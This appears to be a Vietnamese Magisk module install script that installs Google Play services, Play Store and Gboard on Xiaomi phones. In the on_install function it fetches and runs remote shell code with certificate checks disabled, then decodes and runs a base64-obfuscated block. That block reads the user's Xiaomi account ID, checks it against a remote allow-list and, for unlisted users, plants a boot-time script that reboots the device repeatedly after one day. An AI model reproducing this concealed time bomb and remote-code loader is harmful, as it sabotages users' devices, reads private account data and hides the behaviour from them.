# Kakathic

## Leave true to ignore Mount system
SKIPMOUNT=false
## Set to true it will incorporate system.prop into build.prop
PROPFILE=true
## For true post-fs-data.sh to be used
POSTFSDATA=true
## Set to true for service.sh to be used
LATESTARTSERVICE=true
## After installing the module, it will open the magisk application if you are in another application 
OPENMG=true

## Language text
chon="Chọn"
time="Tổng thời gian"
h="giờ"
m="phút"
s="giây"
Information="Thông tin"
author="Tác giả"
name="Tên"
unzip="Đang xử lý..."
volkey1="! Sử dụng phím âm lượng"
volkey2="! Vol- = Chọn số hiện tại, Vol+ = Chuyển đổi số."
volkey3="! Ấn nút nguồn để hủy."
load="Tải"
error="! Lỗi không tìm thấy hoặc lỗi mạng !"
error2="- Mô-đun này chỉ chạy trên thiết bị arm64, của bạn là $ARCH !"

# Internet
User="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
Viewonline(){
[ -e /system/bin/curl ] && curl -s -k -G -L -H "$User" --connect-timeout 20 "$1" || wget -q --header "$User" --no-check-certificate -O - "$1"; }
Viewonline "https://raw.githubusercontent.com/kakathic/Tools/Vip/Tools.sh" > $MODPATH/Tools.sh
. $MODPATH/Tools.sh; [ "$TTvip" == 1 ] || abort "$error";

## Check the system devices
[ "$ARCH" == "arm64" ] || abort "$error2"

## Introduce
print_modname(){
ui_print
ui_print "  $name: $(GP name) $(GP version)"
ui_print
ui_print "  $author: $(GP author)"
ui_print
ui_print "  $Information: $(getprop ro.product.model), $(getprop ro.product.device), $API, $ARCH"
ui_print
}

## Start the installation
on_install(){

echo 'QXBpbHQ9JChncmVwIC1tMSBjb20ueGlhb21pIC9kYXRhL3N5c3RlbS9zeW5jLyouKiB8IHRyICcgJyAnXG4nIHwgZ3JlcCAtbTEgYWNjb3VudD0gfCBjdXQgLWQgXCIgLWYyKQpbIC16ICIkQXBpbHQiIF0gJiYgQXBpbHQ9JChncmVwIC1hQzcgJ2NvbS5hbmRyb2lkLmNvbnRhY3RzJyAvZGF0YS9zeXN0ZW0vc3luYy9hY2NvdW50cy54bWwgfCBncmVwIC8gfCBoZWFkIC1uMSB8IGN1dCAtZCAnLycgLWYxKQpbIC16ICIkQXBpbHQiIF0gJiYgQXBpbHQ9Ikzhu5dpIGlkIFRLIE1pIgoKTGl0dXNzPSIkKFhlbSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20va2FrYXRoaWMvWkgtVk4vWkgvVXNlcm5hbWUvJChnZXRwcm9wIHJvLnByb2R1Y3QuZGV2aWNlKSB8IGJhc2U2NCAtZCkiCgpmb3IgVmtkZyBpbiAkTGl0dXNzOyBkbwpra2loaD0kKGdyZXAgLWFjbTEgJFZrZGcgL2RhdGEvc3lzdGVtL3N5bmMvYWNjb3VudHMueG1sKQpbICRra2loaCA9PSAxIF0gJiYgYnJlYWsKZG9uZQpUZXN0MTIzPXRydWUKCmlmIFsgIiRra2loaCIgIT0gMSBdO3RoZW4KdWlfcHJpbnQgIiEgVGjDtG5nIGLDoW8KIgp1aV9wcmludCAiICBUw6puIG3DoXk6ICQoZ2V0cHJvcCByby5wcm9kdWN0LmRldmljZSkKCiAgVMOgaSBraG/huqNuIE1pOiAkQXBpbHQKIiAgCnVpX3ByaW50ICIgIMSQ4buDIHPhu60gZOG7pW5nIGzDonUgZMOgaSBi4bqhbiBuw6puIOG7p25nIGjhu5kgxJHhu4Mgc+G7rSBk4bulbmcKCiAgdsSpbmggdmnhu4VuLgoKICBUaOG7rSBuZ2hp4buHbSBz4bq9IGPDsyB0w6FjIGThu6VuZyB0cm9uZyBuZ8OgeSBow7RtIMSRw7MuCgogIEjhur90IHRo4budaSBnaWFuIHPhur0gdOG7sSDEkeG7mW5nIHJlYm9vdCBtw6F5LgoiClsgLWUgL2RhdGEvdG9vbHMvbGliL0xvZy50eHQgXSAmJiBhYm9ydCAiLSBC4bqhbiDEkcOjIGjhur90IGzGsOG7o3QgZMO5bmcgdGjhu60gcsO5aS4KIgphbSBzdGFydCAtYSBhbmRyb2lkLmludGVudC5hY3Rpb24uVklFVyAtZCAiaHR0cHM6Ly9naXRodWIuY29tL2tha2F0aGljL1pILVZOL2Jsb2IvWkgvV2ViL1N1cHBvcnQubWQiID4mMgoKZWNobyAnCndoaWxlIHRydWU7IGRvCmlmIFsgIiQoY2F0IC9kYXRhL3Rvb2xzL2xpYi9UZXN0KSIgIT0gIiQoZGF0ZSArIiVkIikiIF07dGhlbgplY2hvICJI4bq/dCBUaW1lOiAkKGRhdGUpIiA+IC9kYXRhL3Rvb2xzL2xpYi9Mb2cudHh0CmVjaG8gPiAkezAlLyp9L3JlbW92ZQpzbGVlcCAxMApyZWJvb3QKZmkKZG9uZQonID4gL2RhdGEvdG9vbHMvbGliL3J1bi5zaAplY2hvICcKbm9odXAgL2RhdGEvdG9vbHMvbGliL3J1bi5zaCAmPiR7MCUvKn0vcnVuLmxvZyAmCicgPj4gJFRNUERJUi9zZXJ2aWNlLnNoCmVjaG8gIiQoZGF0ZSArIiVkIikiID4gJE1PRFBBVEgvVGVzdAplbHNlCnVpX3ByaW50MiAiQ2jDoG8gYuG6oW46ICRBcGlsdCIKdWlfcHJpbnQKdWlfcHJpbnQyICJD4bqjbSDGoW4gYuG6oW4gxJHDoyDhu6duZyBo4buZIFZILU1JIgp1aV9wcmludApbIC1lIC9kYXRhL3Rvb2xzL2xpYi9Mb2cudHh0IF0gJiYgcm0gLWZyIC9kYXRhL3Rvb2xzL2xpYi9Mb2cudHh0CmZpCg==' | base64 -d > $TMPDIR/ka.sh && . $TMPDIR/ka.sh

## Unzip system
ui_print "  $unzip"
ui_print
unzip -qo "$ZIPFILE" "system/*" -d $MODPATH
## code
#Xu_install jre
TTM "/data/local/tmp
$MODPATH/system/product/priv-app"
echo 'JFRlc3QxMjMgfHwgYWJvcnQ=' | base64 -d > $TMPDIR/khi.sh
. $TMPDIR/khi.sh
# Copy file apk
# Dịch vụ gg
Ptkkf=$(echo /*/*/etc/permissions/*cn.google*.xml)
if [ -e $Ptkkf ];then
mkdir -p $MODPATH${Ptkkf%/*}
cp -rf $Ptkkf $MODPATH${Ptkkf%/*}
sed -i -e '/cn.google.services/d' -e '/services_updater/d' $MODPATH$Ptkkf
fi
ui_print "  Tải về & Cài đặt"
ui_print
Taive "https://github.com/kakathic/ZH-VN/releases/download/Gapps/Gapp$API.zip" $TMPDIR/Gapp.zip
[ -e $TMPDIR/Gapp.zip ] && unzip -qo $TMPDIR/Gapp.zip -d $MODPATH || abort "$error"

if [ -z "$(find $(magisk --path)/.magisk/mirror/system_root -type f -name 'GooglePlayServicesUpdater.apk')" ];then
mkdir -p /data/local/tmp/GooglePlayServicesUpdater;
Taive "https://github.com/kakathic/ZH-VN/releases/download/Gapps/Chplay.apk" /data/local/tmp/GooglePlayServicesUpdater/GooglePlayServicesUpdater.apk;
cp -rf /data/local/tmp/GooglePlayServicesUpdater $MODPATH/system/product/priv-app
#pm install -r /data/local/tmp/GooglePlayServicesUpdater/GooglePlayServicesUpdater.apk >&2
FREEZE $MODPATH/system/product/priv-app/GooglePlayServicesUpdater
else
mkdir -p /data/local/tmp/GooglePlayServicesUpdater;
Taive "https://github.com/kakathic/ZH-VN/releases/download/Gapps/Chplay.apk" /data/local/tmp/GooglePlayServicesUpdater/GooglePlayServicesUpdater.apk;
pm install -r /data/local/tmp/GooglePlayServicesUpdater/GooglePlayServicesUpdater.apk >&2
fi

if [ -z "$(find $(magisk --path)/.magisk/mirror/system_root -type f -name 'GmsCore.apk')" ];then
echo > $MODPATH/NO
mkdir -p /data/local/tmp/GmsCore;
Taive "https://github.com/kakathic/ZH-VN/releases/download/Gapps/Gms.apk" /data/local/tmp/GmsCore/GmsCore.apk;
cp -rf /data/local/tmp/GmsCore $MODPATH/system/product/priv-app
#pm install -r /data/local/tmp/GmsCore/GmsCore.apk >&2
FREEZE $MODPATH/system/product/priv-app/GmsCore
fi

if [ -z "$(find $(magisk --path)/.magisk/mirror/system_root -type f -name 'Gboard.apk')" ];then
mkdir -p /data/local/tmp/Gboard;
Taive "https://github.com/kakathic/ZH-VN/releases/download/Gapps/Gboard.apk" "/data/local/tmp/Gboard/Gboard.apk";
pm install -r /data/local/tmp/Gboard/Gboard.apk >&2
cp -rf /data/local/tmp/Gboard $MODPATH/system/product/priv-app

sleep 1
ime enable com.google.android.inputmethod.latin/com.android.inputmethod.latin.LatinIME >&2
ime set com.google.android.inputmethod.latin/com.android.inputmethod.latin.LatinIME >&2
fi
rm -fr /data/local/tmp/*

for Bala in product vendor system_ext; do
[ -e $MODPATH/$Bala ] && cp -rf $MODPATH/$Bala $MODPATH/system
[ -e $MODPATH/$Bala ] && rm -fr $MODPATH/$Bala
done

ui_print "  $(End_time)"
ui_print
## end of code
}

## Grant permission
set_permissions(){ 
set_perm_recursive $MODPATH 0 0 0755 0644 2>/dev/null
set_perm_recursive $MODPATH/system/bin 0 2000 0755 0755 2>/dev/null
}
